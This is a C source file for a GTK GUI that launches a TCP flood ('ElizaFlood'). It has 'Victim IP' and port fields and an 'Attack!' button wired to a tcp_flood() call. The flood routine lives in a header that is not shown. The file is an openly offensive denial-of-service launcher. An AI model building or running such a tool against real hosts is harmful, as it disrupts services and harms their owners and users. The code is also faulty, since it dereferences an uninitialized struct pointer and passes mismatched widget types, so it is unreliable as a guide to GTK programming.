#include <gtk/gtk.h>
#include "elizaFlood.h"

struct inputdata {
	gpointer ip;
	gpointer port;
};

static void on_button_clicked(GtkButton *btn, gpointer data) {
	struct inputdata *eingabe = data;
    g_print("%s:%s\n", gtk_entry_get_text(GTK_ENTRY(eingabe->ip)), gtk_entry_get_text(GTK_ENTRY(eingabe->port)));
	tcp_flood(gtk_entry_get_text(eingabe->ip), atoi(gtk_entry_get_text(eingabe->port)), "blabla", 1);
	//tcp_flood("192.168.1.1", 80, "bla", 1);
}

static void on_app_activate(GApplication *app, gpointer data) {
    GtkWidget *vbox = gtk_box_new(TRUE, 1);
    GtkWidget *ip_entry = gtk_entry_new();
    GtkWidget *port_entry = gtk_entry_new();
    GtkWidget *ip_label = gtk_label_new("Victim IP:");
    GtkWidget *port_label = gtk_label_new("Port IP:");
    GtkWidget *window = gtk_application_window_new(GTK_APPLICATION(app));
	GtkWidget *btn = gtk_button_new_with_label("Attack!");
	struct inputdata *packung;
	packung->ip = (gpointer) ip_entry;
    packung->port = (gpointer) port_entry;

	gtk_container_set_border_width(GTK_CONTAINER(vbox), 10);
	gtk_container_set_border_width(GTK_CONTAINER(btn), 10);
    gtk_window_set_default_size(GTK_WINDOW(window),250,100);
    gtk_container_add(GTK_CONTAINER(window), vbox);

    gtk_box_pack_start(GTK_BOX(vbox), ip_label, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), ip_entry, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), port_label, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), port_entry, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), btn, TRUE, TRUE, 0);


    g_signal_connect(btn, "clicked", G_CALLBACK(on_button_clicked),packung);

    gtk_widget_show_all(GTK_WIDGET(window));
}

int main(int argc, char *argv[]) {
    GtkApplication *app = gtk_application_new("Gespel.ElizaFlood", G_APPLICATION_FLAGS_NONE);
    g_signal_connect(app, "activate", G_CALLBACK(on_app_activate), NULL);

    int status = g_application_run(G_APPLICATION(app), argc, argv);

    g_object_unref(app);
    return status;
}
